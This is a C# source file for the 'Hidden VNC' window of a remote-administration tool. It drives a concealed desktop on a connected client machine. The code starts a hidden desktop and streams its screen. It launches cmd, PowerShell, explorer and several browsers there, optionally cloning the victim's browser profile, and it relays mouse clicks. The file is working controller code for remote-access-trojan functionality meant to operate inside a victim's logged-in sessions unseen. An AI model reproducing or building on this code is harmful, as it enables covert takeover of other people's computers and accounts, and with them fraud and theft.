using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Server
{
    public partial class Hvnc : Window
    {
        private ConnectedClient _client;
        private bool _isRunning = false;
        private int _currentQuality = 80;
        private bool _browserCloneEnabled = false;
        private string _selectedBrowser = "";

        public Hvnc(ConnectedClient client)
        {
            InitializeComponent();
            _client = client;
            _client.HvncWindow = this;

            InitializeControls();
            this.Closing += Hvnc_Closing;
        }

        private void InitializeControls()
        {
            // Populate browser dropdown
            comboBox1.Items.Add("100%");
            comboBox1.Items.Add("90%");
            comboBox1.Items.Add("80%");
            comboBox1.Items.Add("70%");
            comboBox1.Items.Add("60%");
            comboBox1.Items.Add("50%");
            comboBox1.Items.Add("40%");
            comboBox1.Items.Add("30%");
            comboBox1.Items.Add("20%");
            comboBox1.Items.Add("10%");
            comboBox1.SelectedIndex = 2; // 80% default

            this.Title = $"Hidden VNC - {_client.ComputerName} ({_client.Username})";
        }

        private async void Button1_Click(object sender, RoutedEventArgs e)
        {
            // Start HVNC
            try
            {
                var message = new StartHvncMessage
                {
                    DesktopName = "hidden_desktop",
                    Quality = _currentQuality
                };

                await NetworkHelper.SendMessageAsync(_client.Stream, message);

                _isRunning = true;
                button1.IsEnabled = false;
                button2.IsEnabled = true;
                checkBox1.IsEnabled = true;

                // Enable all application buttons
                EnableApplicationButtons(true);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start HVNC: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private async void Button2_Click(object sender, RoutedEventArgs e)
        {
            // Stop HVNC
            try
            {
                var message = new StopHvncMessage();
                await NetworkHelper.SendMessageAsync(_client.Stream, message);

                _isRunning = false;
                button1.IsEnabled = true;
                button2.IsEnabled = false;
                checkBox1.IsEnabled = false;
                checkBox1.IsChecked = false;
                _browserCloneEnabled = false;

                // Disable all application buttons
                EnableApplicationButtons(false);

                // Clear image
                PreviewImage.Source = null;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to stop HVNC: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private async void ComboBox1_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (comboBox1.SelectedItem == null || !_isRunning) return;

            try
            {
                string selected = comboBox1.SelectedItem.ToString();
                int quality = int.Parse(selected.Replace("%", ""));
                _currentQuality = quality;

                var message = new SetHvncQualityMessage
                {
                    Quality = quality
                };

                await NetworkHelper.SendMessageAsync(_client.Stream, message);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to set quality: {ex.Message}");
            }
        }

        private async void CheckBox1_CheckedChanged(object sender, RoutedEventArgs e)
        {
            if (!_isRunning) return;

            try
            {
                bool enable = checkBox1.IsChecked == true;

                var message = new HvncBrowserCloneMessage
                {
                    Enable = enable,
                    BrowserType = _selectedBrowser
                };

                await NetworkHelper.SendMessageAsync(_client.Stream, message);
                _browserCloneEnabled = enable;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to toggle browser clone: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        // Application launch buttons
        private async void Button3_Click(object sender, RoutedEventArgs e)
        {
            // Start Explorer
            await LaunchProcess("explorer.exe", "");
        }

        private async void Button4_Click(object sender, RoutedEventArgs e)
        {
            // Run dialog
            await LaunchProcess("rundll32.exe", "shell32.dll,#61");
        }

        private async void Button5_Click(object sender, RoutedEventArgs e)
        {
            // Edge
            _selectedBrowser = "Edge";
            await LaunchBrowser("Edge");
        }

        private async void Button6_Click(object sender, RoutedEventArgs e)
        {
            // Chrome
            _selectedBrowser = "Chrome";
            await LaunchBrowser("Chrome");
        }

        private async void Button7_Click(object sender, RoutedEventArgs e)
        {
            // Firefox
            _selectedBrowser = "Firefox";
            await LaunchBrowser("Firefox");
        }

        private async void Button12_Click(object sender, RoutedEventArgs e)
        {
            // Opera
            _selectedBrowser = "Opera";
            await LaunchBrowser("Opera");
        }

        private async void Button11_Click(object sender, RoutedEventArgs e)
        {
            // Opera GX
            _selectedBrowser = "OperaGX";
            await LaunchBrowser("OperaGX");
        }

        private async void Button10_Click(object sender, RoutedEventArgs e)
        {
            // Brave
            _selectedBrowser = "Brave";
            await LaunchBrowser("Brave");
        }

        private async void Button8_Click(object sender, RoutedEventArgs e)
        {
            // CMD
            await LaunchProcess("cmd.exe", "");
        }

        private async void Button9_Click(object sender, RoutedEventArgs e)
        {
            // PowerShell
            await LaunchProcess("powershell.exe", "");
        }

        private async Task LaunchProcess(string processPath, string arguments)
        {
            if (!_isRunning) return;

            try
            {
                var message = new HvncStartProcessMessage
                {
                    ProcessPath = processPath,
                    Arguments = arguments
                };

                await NetworkHelper.SendMessageAsync(_client.Stream, message);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to launch process: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private async Task LaunchBrowser(string browserType)
        {
            if (!_isRunning) return;

            try
            {
                var message = new HvncLaunchBrowserMessage
                {
                    BrowserType = browserType,
                    CloneProfile = _browserCloneEnabled
                };

                await NetworkHelper.SendMessageAsync(_client.Stream, message);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to launch browser: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void EnableApplicationButtons(bool enable)
        {
            button3.IsEnabled = enable;
            button4.IsEnabled = enable;
            button5.IsEnabled = enable;
            button6.IsEnabled = enable;
            button7.IsEnabled = enable;
            button8.IsEnabled = enable;
            button9.IsEnabled = enable;
            button10.IsEnabled = enable;
            button11.IsEnabled = enable;
            button12.IsEnabled = enable;
        }

        // Handle incoming screen frames
        public void UpdateScreen(byte[] imageData, int width, int height)
        {
            try
            {
                using (var ms = new MemoryStream(imageData))
                {
                    var bitmap = new BitmapImage();
                    bitmap.BeginInit();
                    bitmap.CacheOption = BitmapCacheOption.OnLoad;
                    bitmap.StreamSource = ms;
                    bitmap.EndInit();
                    bitmap.Freeze();

                    PreviewImage.Source = bitmap;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to update screen: {ex.Message}");
            }
        }

        // Handle mouse/keyboard input from preview image
        private async void PreviewImage_Click(object sender, MouseButtonEventArgs e)
        {
            if (!_isRunning || PreviewImage.Source == null) return;

            try
            {
                var position = e.GetPosition(PreviewImage);
                var imageSource = PreviewImage.Source as BitmapSource;

                if (imageSource == null) return;

                // Calculate actual coordinates on the remote desktop
                double scaleX = imageSource.PixelWidth / PreviewImage.ActualWidth;
                double scaleY = imageSource.PixelHeight / PreviewImage.ActualHeight;

                int x = (int)(position.X * scaleX);
                int y = (int)(position.Y * scaleY);

                // Construct lParam (x and y combined)
                int lParam = (y << 16) | (x & 0xFFFF);

                // Determine message type based on button
                int messageType = e.ChangedButton switch
                {
                    MouseButton.Left => e.ButtonState == MouseButtonState.Pressed ? 0x0201 : 0x0202,
                    MouseButton.Right => e.ButtonState == MouseButtonState.Pressed ? 0x0204 : 0x0205,
                    MouseButton.Middle => e.ButtonState == MouseButtonState.Pressed ? 0x0207 : 0x0208,
                    _ => 0x0200
                };

                var message = new HvncInputMessage
                {
                    MessageType = messageType,
                    WParam = 0,
                    LParam = lParam
                };

                await NetworkHelper.SendMessageAsync(_client.Stream, message);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to send input: {ex.Message}");
            }
        }

        private void Hvnc_Closing(object sender, CancelEventArgs e)
        {
            if (_isRunning)
            {
                try
                {
                    var message = new StopHvncMessage();
                    NetworkHelper.SendMessageAsync(_client.Stream, message).Wait();
                }
                catch { }
            }

            if (_client != null)
            {
                _client.HvncWindow = null;
            }
        }
    }
}